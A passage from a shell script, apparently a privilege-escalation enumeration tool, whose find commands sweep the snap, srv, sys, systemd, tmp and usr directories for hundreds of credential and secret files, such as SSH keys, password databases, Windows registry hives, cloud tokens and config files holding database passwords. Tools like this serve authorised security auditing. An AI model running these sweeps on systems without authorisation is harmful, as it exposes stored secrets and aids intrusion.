\"fastcgi_params\" -o -name \"*.p12\" -o -name \"sitemanager.xml\" -o -name \"*.csr\" -o -name \"KeePass.ini\" -o -name \"unattend.txt\" -o -name \"fat.config\" -o -name \"*.vhd\" -o -name \"*.timer\" -o -name \"elasticsearch.y*ml\" -o -name \"ipsec.secrets\" -o -name \"*.ftpconfig\" -o -name \"*password*\" -o -name \"printers.xml\" -o -name \"wsl.exe\" -o -name \"*.crt\" -o -name \"db.php\" -o -name \"*.pfx\" -o -name \"grafana.ini\" -o -name \"mariadb.cnf\" -o -name \"*.psk\" -o -name \"kcpassword\" -o -name \"pgsql.conf\" -o -name \"access.log\" -o -name \"AppEvent.Evt\" -o -name \".htpasswd\" -o -name \"*.der\" -o -name \"config.xml\" -o -name \".wgetrc\" -o -name \"filezilla.xml\" -o -name \"*.pub\" -o -name \"*.pgp\" -o -name \"FreePBX.conf\" -o -name \".msmtprc\" -o -name \"wcx_ftp.ini\" -o -name \"autounattend.xml\" -o -name \"bitcoin.conf\" -o -name \"iis6.log\" -o -name \"000-default.conf\" -o -name \".lesshst\" -o -name \"pgadmin*.db\" -o -name \"pg_hba.conf\" -o -name \"*.sqlite3\" -o -name \"server.xml\" -o -name \"influxdb.conf\" -o -name \"vsftpd.conf\" -o -name \"pagefile.sys\" -o -name \"unattend.xml\" -o -name \"*.kdbx\" -o -name \"id_dsa*\" -o -name \".sudo_as_admin_successful\" -o -name \"groups.xml\" -o -name \"*config*.php\" -o -name \"*_history*\" -o -name \"ws_ftp.ini\" -o -name \"Elastix.conf\" -o -name \"https-xampp.conf\" -o -name \"psk.txt\" -o -name \"Ntds.dit\" -o -name \"*.vmdk\" -o -name \"appcmd.exe\" -o -name \"*.cer\" -o -name \"amportal.conf\" -o -name \"error.log\" -o -name \"ffftp.ini\" -o -name \"*.gnupg\" -o -name \"smb.conf\" -o -name \"rsyncd.conf\" -o -name \"software.sav\" -o -name \"sysprep.inf\" -o -name \"default.sav\" -o -name \"FreeSSHDservice.ini\" -o -name \".roadtools_auth\" -o -name \"rocketchat.service\" -o -name \"snmpd.conf\" -o -name \"snyk.json\" -o -name \"scclient.exe\" -o -name \"gvm-tools.conf\" -o -name \"gitlab.yml\" -o -name \"dockershim.sock\" -o -name \"kibana.y*ml\" -o -name \"SAM\" -o -name \"tomcat-users.xml\" -o -name \".k5login\" -o -name \"*.jks\" -o -name \"cloud.cfg\" -o -name \"docker-compose.yml\" -o -name \"*.ovpn\" -o -name \"glusterfs.ca\" -o -name \"azureProfile.json\" -o -name \".gitconfig\" -o -name \"legacy_credentials.db\" -o -name \"pwd.ibd\" -o -name \"debian.cnf\" -o -name \"gitlab.rm\" -o -name \"ddclient.conf\" -o -name \"*.keytab\" -o -name \"credentials.xml\" -o -name \".git\" -o -name \"glusterfs.key\" -o -name \"krb5.conf\" -o -name \"httpd.conf\" -o -name \"AzureRMContext.json\" -o -name \"cesi.conf\" -o -name \"*vnc*.xml\" -o -name \"authorized_keys\" -o -name \"passbolt.php\" -o -name \"anaconda-ks.cfg\" -o -name \"sip.conf\" -o -name \"*.viminfo\" -o -name \".flyrc\" -o -name \"autologin\" -o -name \"credentials.db\" -o -name \"krb5cc_*\" -o -name \"frakti.sock\" -o -name \"zabbix_agentd.conf\" -o -name \"supervisord.conf\" -o -name \"known_hosts\" -o -name \"datasources.xml\" -o -name \"*vnc*.txt\" -o -name \"access_tokens.json\" -o -name \"backup\" -o -name \"ipsec.conf\" -o -name \"atlantis.db\" -o -name \"protecteduserkey.bin\" -o -name \"*.swp\" -o -name \"snyk.config.json\" -o -name \"my.ini\" -o -name \"crio.sock\" -o -name \"winscp.ini\" -o -name \".bashrc\" -o -name \"bash.exe\" -o -name \"software\" -o -name \"*.key\" -o -name \"KeePass.enforced*\" -o -name \"passwd\" -o -name \"*.rdg\" -o -name \"*vnc*.ini\" -o -name \"TokenCache.dat\" -o -name \"drives.xml\" -o -name \"mosquitto.conf\" -o -name \"security.sav\" -o -name \"password*.ibd\" -o -name \".secrets.mkey\" -o -name \"unattended.xml\" -o -name \"backups\" -o -name \"Dockerfile\" -o -name \"system.sav\" -o -name \"passwd.ibd\" -o -name \"*.tfstate\" -o -name \"rsyncd.secrets\" -o -name \"pgadmin4.db\" -o -name \"redis.conf\" -o -name \"SYSTEM\" -o -name \"web*.config\" -o -name \"vault-ssh-helper.hcl\" -o -name \"setupinfo.bak\" -o -name \"unattend.inf\" -o -name \"scheduledtasks.xml\" -o -name \"secrets.ldb\" -o -name \"wp-config.php\" -o -name \"database.php\" -o -name \"*.db\" -o -name \"*credential*\" -o -name \"*.keyring\" -o -name \"kadm5.acl\" -o -name \"racoon.conf\" -o -name \"sysprep.xml\" -o -name \"*.vhdx\" -o -name \"accessTokens.json\" -o -name \"plum.sqlite\" -o -name \".pypirc\" -o -name \"config.php\" -o -name \"sites.ini\" -o -name \"ntuser.dat\" -o -name \"hudson.util.Secret\" -o -name \"sssd.conf\" -o -name \"log4j-core*.jar\" -o -name \".boto\" -o -name \"sentry.conf.py\" -o -name \".recently-used.xbel\" -o -name \".vault-token\" -o -name \"settings.php\" -o -name \"php.ini\" -o -name \"hosts.equiv\" -o -name \"glusterfs.pem\" -o -name \"autologin.conf\" -o -name \".profile\" -o -name \"ConsoleHost_history.txt\" -o -name \"rpcd\" -o -name \"docker.socket\" -o -name \"mysqld.cnf\" -o -name \"postgresql.conf\" -o -name \"airflow.cfg\" -o -name \".Xauthority\" -o -name \"webserver_config.py\" -o -name \"setupinfo\" -o -name \".google_authenticator\" -o -name \"NetSetup.log\" -o -name \"*.tf\" -o -name \".git-credentials\" -o -name \"rktlet.sock\" -o -name \"*.gpg\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_SNAP=`eval_bckgrd "find ${ROOT_FOLDER}snap -name \"storage.php\" -o -name \"firebase-tools.json\" -o -name \".credentials.json\" -o -name \"jetty-realm.properties\" -o -name \"*.service\" -o -name \".github\" -o -name \"adc.json\" -o -name \".erlang.cookie\" -o -name \"id_rsa*\" -o -name \"*.pem\" -o -name \".plan\" -o -name \"hostapd.conf\" -o -name \"docker.sock\" -o -name \"recentservers.xml\" -o -name \"master.key\" -o -name \"ftp.config\" -o -name \"zabbix_server.conf\" -o -name \"containerd.sock\" -o -name \"*.keystore\" -o -name \"RDCMan.settings\" -o -name \"index.dat\" -o -name \"secrets.yml\" -o -name \".env*\" -o -name \"https.conf\" -o -name \"SecEvent.Evt\" -o -name \"KeePass.config*\" -o -name \".ldaprc\" -o -name \"nginx.conf\" -o -name \".rhosts\" -o -name \"*vnc*.c*nf*\" -o -name \"authorized_hosts\" -o -name \"*.socket\" -o -name \"ftp.ini\" -o -name \"mongod*.conf\" -o -name \"my.cnf\" -o -name \"creds*\" -o -name \"access_tokens.db\" -o -name \"*.sqlite\" -o -name \"api_key\" -o -name \"fastcgi_params\" -o -name \"*.p12\" -o -name \"sitemanager.xml\" -o -name \"*.csr\" -o -name \"KeePass.ini\" -o -name \"unattend.txt\" -o -name \"fat.config\" -o -name \"*.vhd\" -o -name \"*.timer\" -o -name \"elasticsearch.y*ml\" -o -name \"ipsec.secrets\" -o -name \"*.ftpconfig\" -o -name \"*password*\" -o -name \"printers.xml\" -o -name \"wsl.exe\" -o -name \"*.crt\" -o -name \"db.php\" -o -name \"*.pfx\" -o -name \"grafana.ini\" -o -name \"mariadb.cnf\" -o -name \"*.psk\" -o -name \"kcpassword\" -o -name \"pgsql.conf\" -o -name \"access.log\" -o -name \"AppEvent.Evt\" -o -name \".htpasswd\" -o -name \"*.der\" -o -name \"config.xml\" -o -name \".wgetrc\" -o -name \"filezilla.xml\" -o -name \"*.pub\" -o -name \"*.pgp\" -o -name \"FreePBX.conf\" -o -name \".msmtprc\" -o -name \"wcx_ftp.ini\" -o -name \"autounattend.xml\" -o -name \"bitcoin.conf\" -o -name \"iis6.log\" -o -name \"000-default.conf\" -o -name \".lesshst\" -o -name \"pgadmin*.db\" -o -name \"pg_hba.conf\" -o -name \"*.sqlite3\" -o -name \"server.xml\" -o -name \"influxdb.conf\" -o -name \"vsftpd.conf\" -o -name \"pagefile.sys\" -o -name \"unattend.xml\" -o -name \"*.kdbx\" -o -name \"id_dsa*\" -o -name \".sudo_as_admin_successful\" -o -name \"groups.xml\" -o -name \"*config*.php\" -o -name \"*_history*\" -o -name \"ws_ftp.ini\" -o -name \"Elastix.conf\" -o -name \"https-xampp.conf\" -o -name \"psk.txt\" -o -name \"Ntds.dit\" -o -name \"*.vmdk\" -o -name \"appcmd.exe\" -o -name \"*.cer\" -o -name \"amportal.conf\" -o -name \"error.log\" -o -name \"ffftp.ini\" -o -name \"*.gnupg\" -o -name \"smb.conf\" -o -name \"rsyncd.conf\" -o -name \"software.sav\" -o -name \"sysprep.inf\" -o -name \"default.sav\" -o -name \"FreeSSHDservice.ini\" -o -name \".roadtools_auth\" -o -name \"rocketchat.service\" -o -name \"snmpd.conf\" -o -name \"snyk.json\" -o -name \"scclient.exe\" -o -name \"gvm-tools.conf\" -o -name \"gitlab.yml\" -o -name \"dockershim.sock\" -o -name \"kibana.y*ml\" -o -name \"SAM\" -o -name \"tomcat-users.xml\" -o -name \".k5login\" -o -name \"*.jks\" -o -name \"cloud.cfg\" -o -name \"docker-compose.yml\" -o -name \"*.ovpn\" -o -name \"glusterfs.ca\" -o -name \"azureProfile.json\" -o -name \".gitconfig\" -o -name \"legacy_credentials.db\" -o -name \"pwd.ibd\" -o -name \"debian.cnf\" -o -name \"gitlab.rm\" -o -name \"ddclient.conf\" -o -name \"*.keytab\" -o -name \"credentials.xml\" -o -name \".git\" -o -name \"glusterfs.key\" -o -name \"krb5.conf\" -o -name \"httpd.conf\" -o -name \"AzureRMContext.json\" -o -name \"cesi.conf\" -o -name \"*vnc*.xml\" -o -name \"authorized_keys\" -o -name \"passbolt.php\" -o -name \"anaconda-ks.cfg\" -o -name \"sip.conf\" -o -name \"*.viminfo\" -o -name \".flyrc\" -o -name \"autologin\" -o -name \"credentials.db\" -o -name \"krb5cc_*\" -o -name \"frakti.sock\" -o -name \"zabbix_agentd.conf\" -o -name \"supervisord.conf\" -o -name \"known_hosts\" -o -name \"datasources.xml\" -o -name \"*vnc*.txt\" -o -name \"access_tokens.json\" -o -name \"backup\" -o -name \"ipsec.conf\" -o -name \"atlantis.db\" -o -name \"protecteduserkey.bin\" -o -name \"*.swp\" -o -name \"snyk.config.json\" -o -name \"my.ini\" -o -name \"crio.sock\" -o -name \"winscp.ini\" -o -name \".bashrc\" -o -name \"bash.exe\" -o -name \"software\" -o -name \"*.key\" -o -name \"KeePass.enforced*\" -o -name \"passwd\" -o -name \"*.rdg\" -o -name \"*vnc*.ini\" -o -name \"TokenCache.dat\" -o -name \"drives.xml\" -o -name \"mosquitto.conf\" -o -name \"security.sav\" -o -name \"password*.ibd\" -o -name \".secrets.mkey\" -o -name \"unattended.xml\" -o -name \"backups\" -o -name \"Dockerfile\" -o -name \"system.sav\" -o -name \"passwd.ibd\" -o -name \"*.tfstate\" -o -name \"rsyncd.secrets\" -o -name \"pgadmin4.db\" -o -name \"redis.conf\" -o -name \"SYSTEM\" -o -name \"web*.config\" -o -name \"vault-ssh-helper.hcl\" -o -name \"setupinfo.bak\" -o -name \"unattend.inf\" -o -name \"scheduledtasks.xml\" -o -name \"secrets.ldb\" -o -name \"wp-config.php\" -o -name \"database.php\" -o -name \"*.db\" -o -name \"*credential*\" -o -name \"*.keyring\" -o -name \"kadm5.acl\" -o -name \"racoon.conf\" -o -name \"sysprep.xml\" -o -name \"*.vhdx\" -o -name \"accessTokens.json\" -o -name \"plum.sqlite\" -o -name \".pypirc\" -o -name \"config.php\" -o -name \"sites.ini\" -o -name \"ntuser.dat\" -o -name \"hudson.util.Secret\" -o -name \"sssd.conf\" -o -name \"log4j-core*.jar\" -o -name \".boto\" -o -name \"sentry.conf.py\" -o -name \".recently-used.xbel\" -o -name \".vault-token\" -o -name \"settings.php\" -o -name \"php.ini\" -o -name \"hosts.equiv\" -o -name \"glusterfs.pem\" -o -name \"autologin.conf\" -o -name \".profile\" -o -name \"ConsoleHost_history.txt\" -o -name \"rpcd\" -o -name \"docker.socket\" -o -name \"mysqld.cnf\" -o -name \"postgresql.conf\" -o -name \"airflow.cfg\" -o -name \".Xauthority\" -o -name \"webserver_config.py\" -o -name \"setupinfo\" -o -name \".google_authenticator\" -o -name \"NetSetup.log\" -o -name \"*.tf\" -o -name \".git-credentials\" -o -name \"rktlet.sock\" -o -name \"*.gpg\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_SRV=`eval_bckgrd "find ${ROOT_FOLDER}srv -name \"storage.php\" -o -name \"firebase-tools.json\" -o -name \".credentials.json\" -o -name \"jetty-realm.properties\" -o -name \"*.service\" -o -name \".github\" -o -name \"adc.json\" -o -name \".erlang.cookie\" -o -name \"id_rsa*\" -o -name \"*.pem\" -o -name \".plan\" -o -name \"hostapd.conf\" -o -name \"docker.sock\" -o -name \"recentservers.xml\" -o -name \"master.key\" -o -name \"ftp.config\" -o -name \"zabbix_server.conf\" -o -name \"containerd.sock\" -o -name \"*.keystore\" -o -name \"RDCMan.settings\" -o -name \"index.dat\" -o -name \"secrets.yml\" -o -name \".env*\" -o -name \"https.conf\" -o -name \"SecEvent.Evt\" -o -name \"KeePass.config*\" -o -name \".ldaprc\" -o -name \"nginx.conf\" -o -name \".rhosts\" -o -name \"*vnc*.c*nf*\" -o -name \"authorized_hosts\" -o -name \"*.socket\" -o -name \"ftp.ini\" -o -name \"mongod*.conf\" -o -name \"my.cnf\" -o -name \"creds*\" -o -name \"access_tokens.db\" -o -name \"*.sqlite\" -o -name \"api_key\" -o -name \"fastcgi_params\" -o -name \"*.p12\" -o -name \"sitemanager.xml\" -o -name \"*.csr\" -o -name \"KeePass.ini\" -o -name \"unattend.txt\" -o -name \"fat.config\" -o -name \"*.vhd\" -o -name \"*.timer\" -o -name \"elasticsearch.y*ml\" -o -name \"ipsec.secrets\" -o -name \"*.ftpconfig\" -o -name \"*password*\" -o -name \"printers.xml\" -o -name \"wsl.exe\" -o -name \"*.crt\" -o -name \"db.php\" -o -name \"*.pfx\" -o -name \"grafana.ini\" -o -name \"mariadb.cnf\" -o -name \"*.psk\" -o -name \"kcpassword\" -o -name \"pgsql.conf\" -o -name \"access.log\" -o -name \"AppEvent.Evt\" -o -name \".htpasswd\" -o -name \"*.der\" -o -name \"config.xml\" -o -name \".wgetrc\" -o -name \"filezilla.xml\" -o -name \"*.pub\" -o -name \"*.pgp\" -o -name \"FreePBX.conf\" -o -name \".msmtprc\" -o -name \"wcx_ftp.ini\" -o -name \"autounattend.xml\" -o -name \"bitcoin.conf\" -o -name \"iis6.log\" -o -name \"000-default.conf\" -o -name \".lesshst\" -o -name \"pgadmin*.db\" -o -name \"pg_hba.conf\" -o -name \"*.sqlite3\" -o -name \"server.xml\" -o -name \"influxdb.conf\" -o -name \"vsftpd.conf\" -o -name \"pagefile.sys\" -o -name \"unattend.xml\" -o -name \"*.kdbx\" -o -name \"id_dsa*\" -o -name \".sudo_as_admin_successful\" -o -name \"groups.xml\" -o -name \"*config*.php\" -o -name \"*_history*\" -o -name \"ws_ftp.ini\" -o -name \"Elastix.conf\" -o -name \"https-xampp.conf\" -o -name \"psk.txt\" -o -name \"Ntds.dit\" -o -name \"*.vmdk\" -o -name \"appcmd.exe\" -o -name \"*.cer\" -o -name \"amportal.conf\" -o -name \"error.log\" -o -name \"ffftp.ini\" -o -name \"*.gnupg\" -o -name \"smb.conf\" -o -name \"rsyncd.conf\" -o -name \"software.sav\" -o -name \"sysprep.inf\" -o -name \"default.sav\" -o -name \"FreeSSHDservice.ini\" -o -name \".roadtools_auth\" -o -name \"rocketchat.service\" -o -name \"snmpd.conf\" -o -name \"snyk.json\" -o -name \"scclient.exe\" -o -name \"gvm-tools.conf\" -o -name \"gitlab.yml\" -o -name \"dockershim.sock\" -o -name \"kibana.y*ml\" -o -name \"SAM\" -o -name \"tomcat-users.xml\" -o -name \".k5login\" -o -name \"*.jks\" -o -name \"cloud.cfg\" -o -name \"docker-compose.yml\" -o -name \"*.ovpn\" -o -name \"glusterfs.ca\" -o -name \"azureProfile.json\" -o -name \".gitconfig\" -o -name \"legacy_credentials.db\" -o -name \"pwd.ibd\" -o -name \"debian.cnf\" -o -name \"gitlab.rm\" -o -name \"ddclient.conf\" -o -name \"*.keytab\" -o -name \"credentials.xml\" -o -name \".git\" -o -name \"glusterfs.key\" -o -name \"krb5.conf\" -o -name \"httpd.conf\" -o -name \"AzureRMContext.json\" -o -name \"cesi.conf\" -o -name \"*vnc*.xml\" -o -name \"authorized_keys\" -o -name \"passbolt.php\" -o -name \"anaconda-ks.cfg\" -o -name \"sip.conf\" -o -name \"*.viminfo\" -o -name \".flyrc\" -o -name \"autologin\" -o -name \"credentials.db\" -o -name \"krb5cc_*\" -o -name \"frakti.sock\" -o -name \"zabbix_agentd.conf\" -o -name \"supervisord.conf\" -o -name \"known_hosts\" -o -name \"datasources.xml\" -o -name \"*vnc*.txt\" -o -name \"access_tokens.json\" -o -name \"backup\" -o -name \"ipsec.conf\" -o -name \"atlantis.db\" -o -name \"protecteduserkey.bin\" -o -name \"*.swp\" -o -name \"snyk.config.json\" -o -name \"my.ini\" -o -name \"crio.sock\" -o -name \"winscp.ini\" -o -name \".bashrc\" -o -name \"bash.exe\" -o -name \"software\" -o -name \"*.key\" -o -name \"KeePass.enforced*\" -o -name \"passwd\" -o -name \"*.rdg\" -o -name \"*vnc*.ini\" -o -name \"TokenCache.dat\" -o -name \"drives.xml\" -o -name \"mosquitto.conf\" -o -name \"security.sav\" -o -name \"password*.ibd\" -o -name \".secrets.mkey\" -o -name \"unattended.xml\" -o -name \"backups\" -o -name \"Dockerfile\" -o -name \"system.sav\" -o -name \"passwd.ibd\" -o -name \"*.tfstate\" -o -name \"rsyncd.secrets\" -o -name \"pgadmin4.db\" -o -name \"redis.conf\" -o -name \"SYSTEM\" -o -name \"web*.config\" -o -name \"vault-ssh-helper.hcl\" -o -name \"setupinfo.bak\" -o -name \"unattend.inf\" -o -name \"scheduledtasks.xml\" -o -name \"secrets.ldb\" -o -name \"wp-config.php\" -o -name \"database.php\" -o -name \"*.db\" -o -name \"*credential*\" -o -name \"*.keyring\" -o -name \"kadm5.acl\" -o -name \"racoon.conf\" -o -name \"sysprep.xml\" -o -name \"*.vhdx\" -o -name \"accessTokens.json\" -o -name \"plum.sqlite\" -o -name \".pypirc\" -o -name \"config.php\" -o -name \"sites.ini\" -o -name \"ntuser.dat\" -o -name \"hudson.util.Secret\" -o -name \"sssd.conf\" -o -name \"log4j-core*.jar\" -o -name \".boto\" -o -name \"sentry.conf.py\" -o -name \".recently-used.xbel\" -o -name \".vault-token\" -o -name \"settings.php\" -o -name \"php.ini\" -o -name \"hosts.equiv\" -o -name \"glusterfs.pem\" -o -name \"autologin.conf\" -o -name \".profile\" -o -name \"ConsoleHost_history.txt\" -o -name \"rpcd\" -o -name \"docker.socket\" -o -name \"mysqld.cnf\" -o -name \"postgresql.conf\" -o -name \"airflow.cfg\" -o -name \".Xauthority\" -o -name \"webserver_config.py\" -o -name \"setupinfo\" -o -name \".google_authenticator\" -o -name \"NetSetup.log\" -o -name \"*.tf\" -o -name \".git-credentials\" -o -name \"rktlet.sock\" -o -name \"*.gpg\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_SYS=`eval_bckgrd "find ${ROOT_FOLDER}sys -name \"*.socket\" -o -name \"*.service\" -o -name \"*.timer\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_SYSTEM=`eval_bckgrd "find ${ROOT_FOLDER}system -name \"*.socket\" -o -name \"*.service\" -o -name \"*.timer\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_SYSTEMD=`eval_bckgrd "find ${ROOT_FOLDER}systemd -name \"rocketchat.service\" -o -name \"*.socket\" -o -name \"*.service\" -o -name \"*.timer\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_TMP=`eval_bckgrd "find ${ROOT_FOLDER}tmp -name \"storage.php\" -o -name \"firebase-tools.json\" -o -name \".credentials.json\" -o -name \"jetty-realm.properties\" -o -name \"*.service\" -o -name \".github\" -o -name \"adc.json\" -o -name \".erlang.cookie\" -o -name \"id_rsa*\" -o -name \"*.pem\" -o -name \".plan\" -o -name \"hostapd.conf\" -o -name \"docker.sock\" -o -name \"recentservers.xml\" -o -name \"master.key\" -o -name \"ftp.config\" -o -name \"zabbix_server.conf\" -o -name \"containerd.sock\" -o -name \"*.keystore\" -o -name \"RDCMan.settings\" -o -name \"index.dat\" -o -name \"secrets.yml\" -o -name \".env*\" -o -name \"https.conf\" -o -name \"SecEvent.Evt\" -o -name \"KeePass.config*\" -o -name \".ldaprc\" -o -name \"nginx.conf\" -o -name \".rhosts\" -o -name \"*vnc*.c*nf*\" -o -name \"authorized_hosts\" -o -name \"*.socket\" -o -name \"ftp.ini\" -o -name \"mongod*.conf\" -o -name \"my.cnf\" -o -name \"creds*\" -o -name \"access_tokens.db\" -o -name \"*.sqlite\" -o -name \"api_key\" -o -name \"fastcgi_params\" -o -name \"*.p12\" -o -name \"sitemanager.xml\" -o -name \"*.csr\" -o -name \"KeePass.ini\" -o -name \"unattend.txt\" -o -name \"fat.config\" -o -name \"*.vhd\" -o -name \"*.timer\" -o -name \"elasticsearch.y*ml\" -o -name \"ipsec.secrets\" -o -name \"*.ftpconfig\" -o -name \"*password*\" -o -name \"printers.xml\" -o -name \"wsl.exe\" -o -name \"*.crt\" -o -name \"db.php\" -o -name \"*.pfx\" -o -name \"grafana.ini\" -o -name \"mariadb.cnf\" -o -name \"*.psk\" -o -name \"kcpassword\" -o -name \"pgsql.conf\" -o -name \"access.log\" -o -name \"AppEvent.Evt\" -o -name \".htpasswd\" -o -name \"*.der\" -o -name \"config.xml\" -o -name \".wgetrc\" -o -name \"filezilla.xml\" -o -name \"*.pub\" -o -name \"*.pgp\" -o -name \"FreePBX.conf\" -o -name \".msmtprc\" -o -name \"wcx_ftp.ini\" -o -name \"autounattend.xml\" -o -name \"bitcoin.conf\" -o -name \"iis6.log\" -o -name \"000-default.conf\" -o -name \".lesshst\" -o -name \"pgadmin*.db\" -o -name \"pg_hba.conf\" -o -name \"*.sqlite3\" -o -name \"server.xml\" -o -name \"influxdb.conf\" -o -name \"vsftpd.conf\" -o -name \"pagefile.sys\" -o -name \"unattend.xml\" -o -name \"*.kdbx\" -o -name \"id_dsa*\" -o -name \".sudo_as_admin_successful\" -o -name \"groups.xml\" -o -name \"*config*.php\" -o -name \"*_history*\" -o -name \"ws_ftp.ini\" -o -name \"Elastix.conf\" -o -name \"https-xampp.conf\" -o -name \"psk.txt\" -o -name \"Ntds.dit\" -o -name \"*.vmdk\" -o -name \"appcmd.exe\" -o -name \"*.cer\" -o -name \"amportal.conf\" -o -name \"error.log\" -o -name \"ffftp.ini\" -o -name \"*.gnupg\" -o -name \"smb.conf\" -o -name \"rsyncd.conf\" -o -name \"software.sav\" -o -name \"sysprep.inf\" -o -name \"default.sav\" -o -name \"FreeSSHDservice.ini\" -o -name \".roadtools_auth\" -o -name \"rocketchat.service\" -o -name \"snmpd.conf\" -o -name \"snyk.json\" -o -name \"scclient.exe\" -o -name \"gvm-tools.conf\" -o -name \"gitlab.yml\" -o -name \"dockershim.sock\" -o -name \"kibana.y*ml\" -o -name \"SAM\" -o -name \"tomcat-users.xml\" -o -name \".k5login\" -o -name \"*.jks\" -o -name \"cloud.cfg\" -o -name \"docker-compose.yml\" -o -name \"*.ovpn\" -o -name \"glusterfs.ca\" -o -name \"azureProfile.json\" -o -name \".gitconfig\" -o -name \"legacy_credentials.db\" -o -name \"pwd.ibd\" -o -name \"debian.cnf\" -o -name \"gitlab.rm\" -o -name \"ddclient.conf\" -o -name \"sess_*\" -o -name \"*.keytab\" -o -name \"credentials.xml\" -o -name \".git\" -o -name \"glusterfs.key\" -o -name \"krb5.conf\" -o -name \"httpd.conf\" -o -name \"AzureRMContext.json\" -o -name \"cesi.conf\" -o -name \"*vnc*.xml\" -o -name \"authorized_keys\" -o -name \"passbolt.php\" -o -name \"anaconda-ks.cfg\" -o -name \"sip.conf\" -o -name \"*.viminfo\" -o -name \".flyrc\" -o -name \"autologin\" -o -name \"credentials.db\" -o -name \"krb5cc_*\" -o -name \"frakti.sock\" -o -name \"zabbix_agentd.conf\" -o -name \"supervisord.conf\" -o -name \"known_hosts\" -o -name \"datasources.xml\" -o -name \"*vnc*.txt\" -o -name \"access_tokens.json\" -o -name \"backup\" -o -name \"ipsec.conf\" -o -name \"atlantis.db\" -o -name \"protecteduserkey.bin\" -o -name \"*.swp\" -o -name \"snyk.config.json\" -o -name \"my.ini\" -o -name \"crio.sock\" -o -name \"winscp.ini\" -o -name \".bashrc\" -o -name \"bash.exe\" -o -name \"software\" -o -name \"*.key\" -o -name \"KeePass.enforced*\" -o -name \"passwd\" -o -name \"*.rdg\" -o -name \"*vnc*.ini\" -o -name \"TokenCache.dat\" -o -name \"drives.xml\" -o -name \"mosquitto.conf\" -o -name \"security.sav\" -o -name \"password*.ibd\" -o -name \".secrets.mkey\" -o -name \"unattended.xml\" -o -name \"backups\" -o -name \"Dockerfile\" -o -name \"system.sav\" -o -name \"passwd.ibd\" -o -name \"*.tfstate\" -o -name \"rsyncd.secrets\" -o -name \"pgadmin4.db\" -o -name \"redis.conf\" -o -name \"SYSTEM\" -o -name \"web*.config\" -o -name \"vault-ssh-helper.hcl\" -o -name \"setupinfo.bak\" -o -name \"unattend.inf\" -o -name \"scheduledtasks.xml\" -o -name \"agent*\" -o -name \"secrets.ldb\" -o -name \"wp-config.php\" -o -name \"database.php\" -o -name \"*.db\" -o -name \"*credential*\" -o -name \"*.keyring\" -o -name \"kadm5.acl\" -o -name \"racoon.conf\" -o -name \"sysprep.xml\" -o -name \"*.vhdx\" -o -name \"accessTokens.json\" -o -name \"plum.sqlite\" -o -name \".pypirc\" -o -name \"config.php\" -o -name \"sites.ini\" -o -name \"ntuser.dat\" -o -name \"hudson.util.Secret\" -o -name \"sssd.conf\" -o -name \"log4j-core*.jar\" -o -name \".boto\" -o -name \"sentry.conf.py\" -o -name \".recently-used.xbel\" -o -name \".vault-token\" -o -name \"settings.php\" -o -name \"php.ini\" -o -name \"hosts.equiv\" -o -name \"glusterfs.pem\" -o -name \"autologin.conf\" -o -name \".profile\" -o -name \"ConsoleHost_history.txt\" -o -name \"rpcd\" -o -name \"docker.socket\" -o -name \"mysqld.cnf\" -o -name \"postgresql.conf\" -o -name \"airflow.cfg\" -o -name \".Xauthority\" -o -name \"webserver_config.py\" -o -name \"setupinfo\" -o -name \".google_authenticator\" -o -name \"NetSetup.log\" -o -name \"*.tf\" -o -name \".git-credentials\" -o -name \"rktlet.sock\" -o -name \"*.gpg\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_USR=`eval_bckgrd "find ${ROOT_FOLDER}usr -name \"storage.php\" -o -name \"firebase-tools.json\" -o -name \".credentials.json\" -o -name \"jetty-realm.properties\" -o -name \"*.service\" -o -name \".github\" -o -name \"adc.json\" -o -name \".erlang.cookie\" -o -name \"id_rsa*\" -o -name \"*.pem\" -o -name \".plan\" -o -name \"hostapd.conf\" -o -name \"docker.sock\" -o -name \"recentservers.xml\" -o -name \"master.key\" -o -name \"ftp.config\" -o -name \"zabbix_server.conf\" -o -name \"containerd.sock\" -o -name \"*.keystore\" -o -name \"RDCMan.settings\" -o -name \"index.dat\" -o -name \"secrets.yml\" -o -name \".env*\" -o -name \"https.conf\" -o -name \"SecEvent.Evt\" -o -name \"KeePass.config*\" -o -name \".ldaprc\" -o -name \"nginx.conf\" -o -name \".rhosts\" -o -name \"*vnc*.c*nf*\" -o -name \"authorized_hosts\" -o -name \"*.socket\" -o -name \"ftp.ini\" -o -name \"mongod*.conf\" -o -name \"ssh*config\" -o -name \"my.cnf\" -o -name \"creds*\" -o -name \"access_tokens.db\" -o -name \"*.sqlite\" -o -name \"api_key\" -o -name \"fastcgi_params\" -o -name \"*.p12\" -o -name \"sitemanager.xml\" -o -name \"*.csr\" -o -name \"KeePass.ini\" -o -name \"unattend.txt\" -o -name \"fat.config\" -o -name \"*.vhd\" -o -name \"*.timer\" -o -name \"elasticsearch.y*ml\" -o -name \"ipsec.secrets\" -o -name \"*.ftpconfig\" -o -name \"*password*\" -o -name \"printers.xml\" -o -name \"wsl.exe\" -o -name \"*.crt\" -o -name \"db.php\" -o -name \"*.pfx\" -o -name \"grafana.ini\" -o -name \"mariadb.cnf\" -o -name \"*.psk\" -o -name \"kcpassword\" -o -name \"pgsql.conf\" -o -name \"access.log\" -o -name \"AppEvent.Evt\" -o -name \".htpasswd\" -o -name \"*.der\" -o -name \"config.xml\" -o -name \".wgetrc\" -o -name \"filezilla.xml\" -o -name \"*.pub\" -o -name \"*.pgp\" -o -name \"FreePBX.conf\" -o -name \".msmtprc\" -o -name \"wcx_ftp.ini\" -o -name \"autounattend.xml\" -o -name \"bitcoin.conf\" -o -name \"iis6.log\" -o -name \"000-default.conf\" -o -name \".lesshst\" -o -name \"pgadmin*.db\" -o -name \"pg_hba.conf\" -o -name \"*.sqlite3\" -o -name \"server.xml\" -o -name \"influxdb.conf\" -o -name \"vsftpd.conf\" -o -name \"pagefile.sys\" -o -name \"unattend.xml\" -o -name \"*.kdbx\" -o -name \"id_dsa*\" -o -name \".sudo_as_admin_successful\" -o -name \"groups.xml\" -o -name \"*config*.php\" -o -name \"*_history*\" -o -name 